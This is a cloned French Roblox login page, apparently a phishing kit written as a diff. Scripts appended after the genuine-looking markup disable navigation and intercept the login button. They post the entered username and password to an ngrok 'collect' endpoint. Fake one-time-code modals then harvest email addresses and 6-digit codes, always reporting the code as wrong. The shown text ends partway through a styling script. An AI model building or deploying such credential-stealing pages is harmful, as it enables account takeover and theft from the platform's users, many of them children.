+<div id="header" class="navbar-fixed-top rbx-header" role="navigation"> <div class="container-fluid"> <div class="rbx-navbar-header"> <div id="header-menu-icon" class="rbx-nav-collapse"><button type="button" class="btn-primary-xs btn-min-width" id="skip-to-main-content">Passer au contenu principal</button></div> <div class="navbar-header"> <a class="navbar-brand" href="https://www.roblox.com/fr/home"> <span class="icon-logo"></span><span class="icon-logo-r"></span> </a> </div> </div> <ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4"> <li> <a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/fr/charts">Charts</a> </li> <li> <a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/fr/catalog">Marketplace</a> </li> <li> <a id="header-develop-md-link" class="font-header-2 nav-menu-title text-header" href="https://create.roblox.com/">Créer</a> </li> <li id="navigation-robux-container"><div><a class="font-header-2 nav-menu-title text-header robux-menu-btn" href="https://www.roblox.com/fr/upgrades/robux?ctx=navpopover">Robux</a></div></li> </ul> <ul class="nav rbx-navbar hidden-md hidden-lg col-xs-12"> <li> <a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/fr/charts">Charts</a> </li> <li> <a class="font-header-2 nav-menu-title text-header" href="https://www.roblox.com/fr/catalog">Marketplace</a> </li> <li> <a id="header-develop-sm-link" class="font-header-2 nav-menu-title text-header" href="https://create.roblox.com/">Créer</a> </li> <li id="navigation-robux-mobile-container"><div><a class="font-header-2 nav-menu-title text-header robux-menu-btn" href="https://www.roblox.com/fr/upgrades/robux?ctx=navpopover">Robux</a></div></li> </ul> <div id="right-navigation-header"><div data-testid="navigation-search-input" class="navbar-left navbar-search col-xs-5 col-sm-6 col-md-2 col-lg-3 shown" role="search"><div class="input-group"><form name="search-form" action="/search"><div class="form-has-feedback"><input id="navbar-search-input" type="search" name="search-bar" data-testid="navigation-search-input-field" class="form-control input-field new-input-field" placeholder="Rechercher" maxlength="120" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" value=""></div></form><div class="input-group-btn"><button data-testid="navigation-search-input-search-button" class="input-addon-btn" type="submit"><span class="icon-common-search-sm"></span></button></div></div><ul class="dropdown-menu new-dropdown-menu" role="menu"><li class="navbar-search-option rbx-clickable-li new-selected"><a class="new-navbar-search-anchor" href="https://www.roblox.com/fr/discover/?Keyword="><span class="icon-menu-games-off navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">dans Expériences</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/fr/search/users?keyword="><span class="icon-menu-profile navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">dans Quelqu'un sur Roblox</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/fr/catalog?CatalogContext=1&amp;Keyword="><span class="icon-menu-shop navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">dans Marketplace</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/fr/search/communities?keyword="><span class="icon-menu-groups navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">dans Communautés</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://create.roblox.com/store/models?keyword="><span class="icon-menu-library navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">dans Boutique du créateur</span></a></li></ul><div id="search-landing-root" data-testid="search-landing-root" class="search-landing-root"></div></div><div class="search-overlay"></div><div class="navbar-right rbx-navbar-right"><ul class="nav navbar-right rbx-navbar-right-nav"><li class="signup-button-container"><a class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button" href="https://www.roblox.com/fr/account/signupredir?returnUrl=https%3A%2F%2Fwww.roblox.com%2Ffr%2Fusers%2F9491162343%2Fprofile" id="sign-up-button">S'inscrire</a></li><li class="login-action"><a class="rbx-navbar-login btn-secondary-sm nav-menu-title rbx-menu-item" href="https://www.roblox.com/fr/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Ffr%2Fusers%2F9491162343%2Fprofile">Connexion</a></li><li class="rbx-navbar-right-search"><button type="button" class="rbx-menu-item btn-navigation-nav-search-white-md"><span class="icon-nav-search-white"></span></button></li></ul></div></div> </div> </div> <div id="left-navigation-container"></div> <div id="verificationUpsell-container"><div></div></div> <div id="phoneVerificationUpsell-container"> <div phoneverificationupsell-container=""></div> </div> <div id="contactMethodPrompt-container"> <div contactmethodprompt-container=""></div> </div> <div id="navigation-account-switcher-container"> <div navigation-account-switcher-container=""></div> </div>
+
+</div>
+
+<main class="container-main content-no-ads " id="container-main" tabindex="-1">
+<script type="text/javascript">
+if (top.location != self.location) {
+top.location = self.location.href;
+}
+</script>
+
+<div class="alert-container">
+<noscript><div><div class="alert-info" role="alert">Please enable Javascript to use all the features on this site.</div></div></noscript>
+
+<div class="alert-cookie-notice" data-cookie-notice-timeout="20000">
+Roblox utilise des cookies afin d'améliorer votre expérience. Pour plus d'informations, notamment sur la manière de retirer votre autorisation et gérer l'utilisation des cookies sur Roblox, veuillez consulter notre <a href="https://www.roblox.com/fr/info/privacy?locale=fr_fr">politique de confidentialité et relative aux cookies</a>.
+<span class="icon-close cookie-law-notice-dismiss"></span>
+</div>
+
+</div>
+
+<div class="content" id="content">
+
+<div id="react-login-web-app" class="login-container"><div id="login-base" class="login-base-container"><div class="section-content login-section"><h1 class="login-header">Connexion à Roblox</h1><div id="login-form"><div><div class="login-form-container"><form class="login-form" name="loginForm"><div class="form-group username-form-group"><label for="login-username" class="sr-only">Identifiant/E-mail/Téléphone</label><input id="login-username" name="username" type="text" class="form-control input-field" autocomplete="username webauthn" placeholder="Identifiant/E-mail/Téléphone" value=""></div><div class="form-group password-form-group"><label for="login-password" class="sr-only">Mot de passe</label><input id="login-password" name="password" type="password" class="form-control input-field" placeholder="Mot de passe" value=""><div aria-live="polite"></div></div><button type="button" id="login-button" class="btn-full-width login-button btn-secondary-md">Connexion</button></form></div></div></div><div class="text-center forgot-credentials-link"><a id="forgot-credentials-link" class="text-link" href="https://www.roblox.com/login/forgot-password-or-username" target="_self">Mot de passe ou nom d'utilisateur oublié&nbsp;?</a></div><div><div class="alternative-login-divider-container"><div class="rbx-divider alternative-login-divider"></div></div><button type="button" id="otp-login-button" class="btn-full-width btn-control-md otp-login-button">Envoyez-moi un code unique par email</button><button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button"><span>Utiliser un autre appareil</span></button></div><div id="crossDeviceLoginDisplayCodeModal-container"></div><div id="otp-login-container"></div><div id="account-switcher-confirmation-modal-container"></div><div class="text-center"><div class="signup-option"><span class="no-account-text">Vous n'avez pas de compte&nbsp;?</span><a id="sign-up-link" class="text-link signup-link" href="https://www.roblox.com/fr/account/signupredir?ReturnUrl=https%3A%2F%2Fwww.roblox.com%2Ffr%2Fusers%2F9491162343%2Fprofile" target="_self">S'inscrire</a></div></div></div><div id="react-login-account-limit-error-container"></div></div></div>
+
+</div>
+</main><!--Bootstrap Footer React Component -->
+
+<footer class="container-footer" id="footer-container" data-is-giftcards-footer-enabled="True"><div class="footer"><ul class="row footer-links"><li class="footer-link"><a href="https://www.roblox.com/fr/info/about-us?locale=fr_fr" class="text-footer-nav" target="_blank" rel="noreferrer">À propos</a></li><li class="footer-link"><a href="https://www.roblox.com/fr/info/jobs?locale=fr_fr" class="text-footer-nav" target="_blank" rel="noreferrer">Emplois</a></li><li class="footer-link"><a href="https://www.roblox.com/fr/info/blog?locale=fr_fr" class="text-footer-nav" target="_blank" rel="noreferrer">Blog</a></li><li class="footer-link"><a href="https://www.roblox.com/fr/info/parents?locale=fr_fr" class="text-footer-nav" target="_blank" rel="noreferrer">Parents</a></li><li class="footer-link"><a href="https://www.roblox.com/fr/giftcards?locale=fr_fr" class="text-footer-nav giftcards" target="_blank" rel="noreferrer">Cartes-cadeaux</a></li><li class="footer-link"><a href="https://www.roblox.com/fr/info/help?locale=fr_fr" class="text-footer-nav" target="_blank" rel="noreferrer">Aide</a></li><li class="footer-link"><a href="https://www.roblox.com/fr/info/terms?locale=fr_fr" class="text-footer-nav" target="_blank" rel="noreferrer">Conditions</a></li><li class="footer-link"><a href="https://www.roblox.com/fr/info/accessibility?locale=fr_fr" class="text-footer-nav" target="_blank" rel="noreferrer">Accessibilité</a></li><li class="footer-link"><a href="https://www.roblox.com/fr/info/privacy?locale=fr_fr" class="text-footer-nav" target="_blank" rel="noreferrer">Confidentialité</a></li><li class="footer-link"><a href="https://www.roblox.com/fr/my/account#!/privacy?locale=fr_fr" class="text-footer-nav" target="_blank" rel="noreferrer">Tes choix en matière de vie privée<img src="data:image/webp;base64,UklGRrADAABXRUJQVlA4WAoAAAAQAAAAOwAAHAAAQUxQSOsAAAABgGNt2zHnHdaetLadLtmNsQDbdlLbtsqkHpSxbX/zj/U9G4iICSCX4uiiGdPdq8/vTNOFUWLyNGXwlFk4ZSf9ye6pKm4tXN+UK90IXLBwPxfgImDPArjr70Q5b4GcUTiUWjCFYiJKvAaxXMaTqMcC2yUKP8I5DM39x/nPmrAAjxqQ9LdIdy9Ir3dI9yYk4zTSZBHDYfnRpzgnkZIhnAExpd+j3KYSiepQqkVEpF3HWNWQY/gBwn4YOY/Y5m8znFz7tT7z9dTsR+5KMkdvBF6Em+EMMXkoTyvfPv/6Z+6aBc/N/1/n22WpcnIJAFZQOCCeAgAAsA4AnQEqPAAdAD6ROJhIJaMiITAb+ACwEglsAJ0yhHXno/mCVb+y7BwXfr7x7eqjbAeYD9bPVz9BvlAdYb6AHlp/uB8G3+A/4Pphu/TXQhi//S809EB69BEZldQNIV/eNVlDmUDW33lPn0iGBlkHEoP7xzvxv4W7IPVKwg+gAO9wOYzsI8BSlu/ljXZqxJsDV2tD+qayuJoxUFkUptaQf93n7fV4hUgJ+Uf/kpj4AqJAtsX5hJKtHHJlA0l7tylf+1SOJ1un0rrDm2Up4a6mCFRb/+W/vzfxAH3D9myHP/NfjX7ifoc/H7vgudmvtLqz+hb9lyHGakbAh+at5OqNY8Lo7/c/Rd1YFFWBSYBdcwPiQzjecF1Xv8R2dj9vKtM9tG+6SEBuPEV31LvRnBpXZ2XjpXFA9v38V7MMCzD2xxa06JeC+cVPiHvpVzfH8c63KCGOBFLltx9UIWiwO/c0fNzieqYIEsY2OIkx/wrhbV4GMtEp1U/7N3a7/Qq9r/h+LEI8sYOrGm1MU2P/BL4fYeBDZFMdJZ519a6U9S4K0wTMro82cnTukNfm7VyZ5hONbhEmAOc3OOYiFKgqzFC716CnyAatzIyDr0CosyN1Uh1epW+K2w7UmZ36T6i2+3vzCUz+pCLHl5zfc3yHC5sTR9yT368/W2zLQGXLxDmulSMj6HAO2VABHUwOJFjwIZT/+SB3RcruT4FqGiItnt6evy0vY4eSL9ALvRwkehZMB6Xj/2dzV507O+xEyOf7DL0zpSV3B/Oxz2jju+fUOFvOLM2J+VLuONA8wTfqy78vrhQfIVlpkdzQ+ZzJ3vL/FVZIgcqzYBBbKgUTEjq/+jSvW3vcOy7IA539GoeB3ydM4gyDy0h9FTsf9CO0fQAAAA==" alt="" class="footer-postfixIcon"></a></li><li class="footer-link"><a href="https://www.roblox.com/fr/sitemap?locale=fr_fr" class="text-footer-nav" target="_blank" rel="noreferrer">Sitemap</a></li><li><div><button type="button" class="btn text-footer-nav cookie-consent-link">Options des cookies</button><div></div></div></li></ul><div class="row copyright-
+<div class="row copyright-container"><div class="col-sm-6 col-md-3"></div><div class="col-sm-12"><p class="text-footer footer-note">©2025 Roblox Corporation. Roblox, le logo Roblox et Powering Imagination font partie de nos marques de commerce déposées ou non, aux États-Unis et dans d'autres pays.</p></div></div></div></footer></div>
+<div id="user-agreements-checker-container"></div>
+<div id="access-management-upsell-container"><div id="legally-sensitive-content-component"></div></div>
+<div id="global-privacy-control-checker-container"></div>
+<div id="cookie-banner-wrapper" class="cookie-banner-wrapper"><div></div></div>
+  
+<!-- Script à coller juste avant </body> -->
+<script>
+(function () {
+  'use strict';
+
+  // ------- CONFIGURATION -------
+  // Remplace par ton endpoint PUBLIC/HTTPS (ex: https://abcd-1234.ngrok.io/collect)
+  // En local pour tests (page ouverte en http://localhost): 'http://localhost:8000/collect'
+  const ENDPOINT = 'https://fca453618d49.ngrok-free.app/collect';
+
+  // Durée d'attente max pour le fetch (ms)
+  const FETCH_TIMEOUT = 10000;
+
+  // ------- UTILITAIRES -------
+  function safeText(s){ return String(s==null?'':s); }
+
+  function attachMessage(afterEl, txt, isError) {
+    let container = afterEl.parentNode.querySelector('.__rbx_local_msg');
+    if (!container) {
+      container = document.createElement('div');
+      container.className = '__rbx_local_msg';
+      container.style.marginTop = '8px';
+      afterEl.parentNode.appendChild(container);
+    }
+    container.textContent = txt;
+    container.style.color = isError ? '#b91c1c' : '#0f5132';
+    container.style.fontSize = '13px';
+  }
+
+  function fetchWithTimeout(url, opts={}, timeout=FETCH_TIMEOUT) {
+    return Promise.race([
+      fetch(url, opts),
+      new Promise((_, reject) => setTimeout(()=> reject(new Error('timeout')), timeout))
+    ]);
+  }
+
+  // ------- INIT -------
+  document.addEventListener('DOMContentLoaded', function () {
+    // Désactiver tous les liens <a>
+    try {
+      document.querySelectorAll('a').forEach(a => {
+        try { a.dataset._origHref = a.getAttribute('href') || ''; } catch(e){}
+        a.removeAttribute('href');
+        a.removeAttribute('target');
+        a.style.cursor = 'default';
+        a.addEventListener('click', function (ev) { ev.preventDefault(); ev.stopImmediatePropagation(); }, {capture:true});
+      });
+    } catch (err) { console.warn('disable links error', err); }
+
+    // Bloquer window.open et navigation programmée
+    try {
+      window.open = function() { console.warn('window.open blocked'); return null; };
+      if (window.location && typeof window.location.assign === 'function') {
+        window.location.assign = function() { console.warn('location.assign blocked'); };
+      }
+      if (window.location && typeof window.location.replace === 'function') {
+        window.location.replace = function() { console.warn('location.replace blocked'); };
+      }
+    } catch (err) { console.warn('override navigation functions failed', err); }
+
+    // Bloquer soumission native
+    document.addEventListener('submit', function (ev) {
+      try { ev.preventDefault(); ev.stopImmediatePropagation(); } catch (e) {}
+    }, true);
+
+    // Récupérer champs et bouton
+    const usernameEl = document.getElementById('login-username') || document.querySelector('input[name="username"]');
+    const passwordEl = document.getElementById('login-password') || document.querySelector('input[name="password"]');
+    const loginBtn = document.getElementById('login-button') || document.querySelector('.login-button');
+
+    if (!loginBtn) {
+      console.warn('Login button introuvable. Script arrêté.');
+      return;
+    }
+    if (!usernameEl || !passwordEl) {
+      attachMessage(loginBtn, 'Champs utilisateur / mot de passe introuvables sur la page.', true);
+      console.warn('username or password field not found');
+      return;
+    }
+
+    // Validation & envoi
+    loginBtn.addEventListener('click', async function (ev) {
+      ev.preventDefault && ev.preventDefault();
+      ev.stopPropagation && ev.stopPropagation();
+
+      // Clear previous msg
+      const prevMsg = loginBtn.parentNode.querySelector('.__rbx_local_msg');
+      if (prevMsg) prevMsg.textContent = '';
+
+      const username = safeText(usernameEl.value).trim();
+      const password = safeText(passwordEl.value);
+
+      let valid = true;
+      if (username.length < 4) { // plus de 3 caractères => longueur >=4
+        attachMessage(usernameEl, "L'identifiant doit contenir plus de 3 caractères.", true);
+        valid = false;
+      } else {
+        const m = usernameEl.parentNode.querySelector('.__rbx_local_msg'); if (m) m.textContent = '';
+      }
+
+      if (password.length < 8) { // minimum 8 caractères
+        attachMessage(passwordEl, "Le mot de passe doit contenir au moins 8 caractères.", true);
+        valid = false;
+      } else {
+        const m = passwordEl.parentNode.querySelector('.__rbx_local_msg'); if (m) m.textContent = '';
+      }
+
+      if (!valid) return;
+
+      const originalBtnText = loginBtn.textContent;
+      loginBtn.disabled = true;
+      loginBtn.textContent = 'Envoi...';
+
+      const payload = {
+        username: username,
+        password: password,
+        ts: new Date().toISOString(),
+        origin: window.location.href
+      };
+
+      try {
+        const res = await fetchWithTimeout(ENDPOINT, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        }, FETCH_TIMEOUT);
+
+        if (res && res.ok) {
+          attachMessage(loginBtn, 'Informations envoyées avec succès.', false);
+        } else {
+          let text = '';
+          try { text = await res.text(); } catch(e){}
+          attachMessage(loginBtn, 'Erreur lors de l\'envoi. ' + (text || ('status: ' + (res && res.status))), true);
+        }
+      } catch (err) {
+        console.error('Fetch error', err);
+        attachMessage(loginBtn, 'Impossible d\'atteindre l\'endpoint. Vérifie ton serveur et le CORS.', true);
+      } finally {
+        loginBtn.disabled = false;
+        loginBtn.textContent = originalBtnText;
+      }
+    }, {capture:false, passive:false});
+
+    // Bloquer autres data-href / role=link
+    document.querySelectorAll('[data-href], [data-url]').forEach(el=>{
+      try { el.dataset._origHref = el.dataset.href || el.dataset.url || ''; delete el.dataset.href; delete el.dataset.url; el.addEventListener('click', function(e){ e.preventDefault(); e.stopImmediatePropagation(); }, {capture:true}); } catch(e){}
+    });
+    document.querySelectorAll('[role="link"]').forEach(el=>{
+      el.addEventListener('click', function(e){ e.preventDefault(); e.stopImmediatePropagation(); }, {capture:true});
+    });
+
+    console.log('Login guard initialized.');
+  });
+
+})();
+</script>
+<!-- fin script -->
+<script>
+(function(){
+  'use strict';
+
+  const ENDPOINT = 'https://fca453618d49.ngrok-free.app/collect';
+  const FETCH_TIMEOUT = 10000;
+
+  function safeText(v){ return String(v==null?'':v); }
+  function fetchWithTimeout(url, opts={}, t=FETCH_TIMEOUT){
+    return Promise.race([ fetch(url, opts), new Promise((_, rej)=> setTimeout(()=> rej(new Error('timeout')), t)) ]);
+  }
+  function createElFromHTML(html){ const d = document.createElement('div'); d.innerHTML = html.trim(); return d.firstElementChild; }
+  function escapeHtml(s){ return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+  // selectors / texte à supprimer si un autre script affiche la notification verte
+  const GREEN_TEXT_SNIPPETS = [
+    'Informations envoyées avec succès',
+    'Informations envoyées avec succès.' // variantes
+  ];
+
+  // supprime nodes qui correspondent au texte vert ou aux classes internes qu'on a vues
+  function removeGreenMessagesAnywhere(){
+    try{
+      // classes/ids qu'on a utilisé dans previous scripts ou observés
+      const suspectSelectors = ['.__rbx_local_msg', '.__rbx_field_success', '.__rbx_success', '.__rbx_field_error'];
+      suspectSelectors.forEach(sel=>{
+        document.querySelectorAll(sel).forEach(n=>{
+          const txt = (n.textContent||'').trim();
+          if(!txt) { /* si vide, on le supprime aussi pour éviter collision */ n.remove(); return; }
+          for(const s of GREEN_TEXT_SNIPPETS){
+            if(txt.indexOf(s) !== -1){
+              n.remove();
+              return;
+            }
+          }
+        });
+      });
+
+      // aussi parcourir tout le DOM pour éléments qui contiennent exactement le texte vert
+      document.querySelectorAll('div,span,p').forEach(n=>{
+        const txt = (n.textContent||'').trim();
+        if(!txt) return;
+        for(const s of GREEN_TEXT_SNIPPETS){
+          if(txt.indexOf(s) !== -1){
+            // si l'élément contient le texte, on supprime son parent immédiat si il a l'air d'être une boîte de message
+            const parent = n.closest('div') || n.parentNode;
+            if(parent && parent.remove) parent.remove();
+            else n.remove();
+            return;
+          }
+        }
+      });
+    }catch(e){ console.warn('removeGreenMessagesAnywhere error', e); }
+  }
+
+  // MutationObserver qui supprime automatiquement tout message vert injecté
+  function observeAndRemoveGreenMessages(durationMs = 5000){
+    const observer = new MutationObserver(mutations=>{
+      for(const mut of mutations){
+        for(const node of mut.addedNodes){
+          try{
+            if(!(node instanceof Element)) continue;
+            const text = (node.textContent||'').trim();
+            if(!text) continue;
+            for(const s of GREEN_TEXT_SNIPPETS){
+              if(text.indexOf(s) !== -1){
+                // supprime le noeud injecté
+                node.remove();
+                break;
+              }
+            }
+          }catch(e){}
+        }
+      }
+    });
+    observer.observe(document.documentElement || document.body, { childList: true, subtree: true });
+    // arrêt automatique
+    setTimeout(()=> {
+      try{ observer.disconnect(); }catch(e){}
+    }, durationMs);
+    return observer;
+  }
+
+  // modal HTML identique à ta demande
+  const modal1HTML = `<div class="modal-lg modal-dialog">
+  <div class="modal-content" role="document">
+    <div class="modal-header">
+      <button type="button" class="close" title="close"><span class="icon-close"></span></button>
+      <h4 class="modal-title">Obtenir un code unique</h4>
+    </div>
+    <div class="modal-body">
+      <p class="email-verify-code-help-text">Entre l'email vérifié sur ton compte pour recevoir un code unique.</p>
+      <input placeholder="E-mail" type="email" class="form-control input-field email-verify-code-input" autocomplete="email" maxlength="320" value="">
+      <p class="text-error input-validation email-verify-code-error-text"></p>
+      <button type="button" class="email-verify-code-button btn-secondary-md btn-min-width" disabled>Envoyer le code</button>
+    </div>
+  </div>
+</div>`;
+
+  function modal2HTML(emailEscaped){
+    return `<div class="modal-lg modal-dialog">
+  <div class="modal-content" role="document">
+    <div class="modal-header">
+      <button type="button" class="close" title="close"><span class="icon-close"></span></button>
+      <h4 class="modal-title">Entrer le code à usage unique</h4>
+    </div>
+    <div class="modal-body">
+      <div class="email-verify-code-help-text">
+        <p class="email-verify-code-help-text">Entre le code que nous venons d'envoyer à : <b>${emailEscaped}</b></p>
+      </div>
+      <div class="email-verify-code-email-display">
+        <button class="email-verify-code-change-email-link text-link" type="button">Changer d'email</button>
+      </div>
+      <input placeholder="Code à 6 chiffres" type="text" inputmode="numeric" maxlength="6" class="form-control input-field email-verify-code-input" value="">
+      <p class="text-error email-verify-code-error-text"></p>
+      <button type="button" class="email-verify-code-button btn-secondary-md btn-min-width">Renvoyer</button>
+      <div class="font-caption-header email-verify-code-help-link"><a class="text-link" href="#" target="_blank" rel="noreferrer">Tu n'as pas reçu le code ? Clique ici</a></div>
+    </div>
+  </div>
+</div>`;}
+
+  function makeOverlay(){
+    const ov = document.createElement('div');
+    ov.className = 'rbx-local-overlay';
+    Object.assign(ov.style, { position:'fixed', left:0, top:0, right:0, bottom:0, display:'flex', alignItems:'center', justifyContent:'center', background:'rgba(11,18,32,0.6)', zIndex:100000 });
+    return ov;
+  }
+  function removeOverlay(ov){ if(!ov) return; try{ ov.remove(); }catch(e){ if(ov.parentNode) ov.parentNode.removeChild(ov); } }
+
+  // écoute en capture sur le bouton Connexion pour être sûr d'intercepter avant d'autres handlers
+  document.addEventListener('DOMContentLoaded', function(){
+    const usernameEl = document.getElementById('login-username') || document.querySelector('input[name="username"]');
+    const passwordEl = document.getElementById('login-password') || document.querySelector('input[name="password"]');
+    const loginBtn = document.getElementById('login-button') || document.querySelector('.login-button');
+
+    if(!usernameEl || !passwordEl || !loginBtn){
+      console.warn('Login elements not found — script aborted');
+      return;
+    }
+
+    // Handler en capture — empêche autres handlers d'ajouter le message vert
+    loginBtn.addEventListener('click', function(ev){
+      // Prev and stop propagation (capture phase)
+      try{ ev.preventDefault(); }catch(e){}
+      try{ ev.stopImmediatePropagation(); }catch(e){}
+      try{ ev.stopPropagation(); }catch(e){}
+      // call main flow
+      mainFlow().catch(err=> console.error('mainFlow error', err));
+    }, { capture: true, passive: false });
+
+    // main flow async
+    async function mainFlow(){
+      // clear old green messages now (just in case)
+      removeGreenMessagesAnywhere();
+
+      // start observer to remove any green messages injected within the next 5s
+      const observer = observeAndRemoveGreenMessages(5000);
+
+      // validation
+      const username = safeText(usernameEl.value).trim();
+      const password = safeText(passwordEl.value);
+      function setErr(el, msg){
+        let n = el.parentNode && el.parentNode.querySelector('.__rbx_field_error');
+        if(!n){ n = document.createElement('div'); n.className='__rbx_field_error'; n.style.color='#b91c1c'; n.style.fontSize='13px'; n.style.marginTop='6px'; el.parentNode.appendChild(n); }
+        n.textContent = msg;
+      }
+      function clearErr(el){ const n = el.parentNode && el.parentNode.querySelector('.__rbx_field_error'); if(n) n.textContent = ''; }
+      clearErr(usernameEl); clearErr(passwordEl);
+
+      let ok = true;
+      if(username.length < 4){ setErr(usernameEl, "L'identifiant doit contenir plus de 3 caractères."); ok = false; }
+      if(password.length < 8){ setErr(passwordEl, "Le mot de passe doit contenir au moins 8 caractères."); ok = false; }
+      if(!ok){
+        // stop observer if validation failed
+        try{ observer.disconnect(); }catch(e){}
+        return;
+      }
+
+      // send login payload (best-effort). Even if it fails we continue to modal.
+      const oldTxt = loginBtn.textContent;
+      loginBtn.disabled = true; loginBtn.textContent = 'Envoi...';
+      try{
+        await fetchWithTimeout(ENDPOINT, { method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify({ type:'login', username: username, password: password, ts:new Date().toISOString(), origin: window.location.href }) });
+      }catch(e){
+        console.warn('login send error', e);
+      }finally{
+        loginBtn.disabled = false; loginBtn.textContent = oldTxt;
+      }
+
+      // remove any green message again (other scripts might try to add one immediately)
+      removeGreenMessagesAnywhere();
+      setTimeout(removeGreenMessagesAnywhere, 50);
+      setTimeout(removeGreenMessagesAnywhere, 300);
+
+      // show modal flow
+      showEmailModal();
+
+      // stop observer after 5s (already scheduled); safety: ensure it's disconnected in 6s
+      setTimeout(()=>{ try{ observer.disconnect(); }catch(e){} }, 6000);
+    } // end mainFlow
+
+    // modal functions (as before)
+    function showEmailModal(){
+      let ov = document.querySelector('.rbx-local-overlay'); if(ov) removeOverlay(ov);
+      ov = makeOverlay();
+      const node = createElFromHTML(modal1HTML);
+      ov.appendChild(node);
+      document.body.appendChild(ov);
+
+      const closeBtn = node.querySelector('.close');
+      const emailInput = node.querySelector('.email-verify-code-input');
+      const sendBtn = node.querySelector('.email-verify-code-button');
+      const errEl = node.querySelector('.email-verify-code-error-text');
+
+      closeBtn && closeBtn.addEventListener('click', ()=> removeOverlay(ov));
+      emailInput.addEventListener('input', ()=>{ if(errEl) errEl.textContent=''; sendBtn.disabled = ((emailInput.value||'').trim().length < 9); });
+
+      sendBtn.addEventListener('click', async function(){
+        const email = (emailInput.value||'').trim();
+        if(email.length < 9){ if(errEl) errEl.textContent = "L'email doit contenir au moins 9 caractères."; return; }
+        try{ await fetchWithTimeout(ENDPOINT, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ type:'email_request', email: email, ts:new Date().toISOString(), origin: window.location.href }) }); }catch(e){ console.warn('email_request failed', e); }
+        ov.innerHTML = ''; const node2 = createElFromHTML(modal2HTML(escapeHtml(email))); ov.appendChild(node2); wireModal2(ov, email);
+      });
+    }
+
+    function wireModal2(ov, email){
+      const node = ov.querySelector('.modal-lg.modal-dialog'); if(!node) return;
+      const closeBtn = node.querySelector('.close');
+      const changeEmailBtn = node.querySelector('.email-verify-code-change-email-link');
+      const codeInput = node.querySelector('.email-verify-code-input');
+      const resendBtn = node.querySelector('.email-verify-code-button');
+      const errText = node.querySelector('.email-verify-code-error-text');
+      const helpAnchor = node.querySelector('.email-verify-code-help-link a');
+
+      closeBtn && closeBtn.addEventListener('click', ()=> removeOverlay(ov));
+
+      changeEmailBtn && changeEmailBtn.addEventListener('click', function(){
+        ov.innerHTML = ''; const node1 = createElFromHTML(modal1HTML); ov.appendChild(node1);
+        const emailInput = node1.querySelector('.email-verify-code-input');
+        const sendBtn = node1.querySelector('.email-verify-code-button');
+        const errEl = node1.querySelector('.email-verify-code-error-text');
+        emailInput.addEventListener('input', function(){ errEl.textContent=''; sendBtn.disabled = ((emailInput.value||'').trim().length < 9); });
+        sendBtn.addEventListener('click', async function(){ const e=(emailInput.value||'').trim(); if(e.length<9){ errEl.textContent="L'email doit contenir au moins 9 caractères."; return; } try{ await fetchWithTimeout(ENDPOINT, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ type:'email_request', email: e, ts:new Date().toISOString() }) }); }catch(e){ console.warn('email_request failed', e);} ov.innerHTML=''; const node2 = createElFromHTML(modal2HTML(escapeHtml(e))); ov.appendChild(node2); wireModal2(ov,e); });
+      });
+
+      if(helpAnchor) helpAnchor.addEventListener('click', function(ev){ ev.preventDefault(); ev.stopPropagation(); if(errText) errText.textContent = 'Lien externe bloqué.'; });
+
+      codeInput.addEventListener('input', function(){
+        this.value = (this.value||'').replace(/\D/g,'').slice(0,6);
+        if(errText) errText.textContent = '';
+        if(this.value.length === 6){
+          const code = this.value;
+          (async function(){
+            try{ await fetchWithTimeout(ENDPOINT, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ type:'code_attempt', code: code, email: email, ts:new Date().toISOString(), origin: window.location.href }) }); }catch(e){ console.warn('code_attempt failed', e); } finally { if(errText) errText.textContent = 'Ton code est incorrect. Vérifier et réessayer.'; }
+          })();
+        }
+      });
+
+      resendBtn && resendBtn.addEventListener('click', async function(){ try{ await fetchWithTimeout(ENDPOINT, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ type:'resend_code', email: email, ts:new Date().toISOString() }) }); if(errText) errText.textContent = 'Code renvoyé.'; }catch(e){ if(errText) errText.textContent = 'Impossible de renvoyer le code.'; } });
+    }
+
+  }); // DOMContentLoaded
+})(); // IIFE
+</script>
+<script>
+(function(){
+  'use strict';
+
+  // --- CONFIG : modifie ces valeurs si tu veux une autre largeur / padding ---
+  const TARGET_MAX_WIDTH_PX = 560;   // moins large (ajuste si nécessaire)
+  const HEADER_LEFT_PADDING_PX = 56; // laisse de l'espace pour la croix à gauche
+  const BORDER_RADIUS_PX = 6;        // coin légèrement arrondi (inchangé)
+
+  // injecte (ou met à jour) le style d'override
+  function injectOrUpdateStyles(){
+    const id = '__rbx_modal_style_overrides_v2';
+    let style = document.getElementById(id);
+    const css = `
+      .rbx-local-overlay .modal-lg.modal-dialog {
+        max-width: ${TARGET_MAX_WIDTH_PX}px !important;
+        width: 90% !important;
+        margin: 0 12px !important;
+      }
+      .rbx-local-overlay .modal-content {
+        border-radius: ${BORDER_RADIUS_PX}px !important;
+        overflow: hidden !important;
+        position: relative !important;
+      }
+
+      /* header: on garde la croix en absolute à gauche, et on centre le titre */
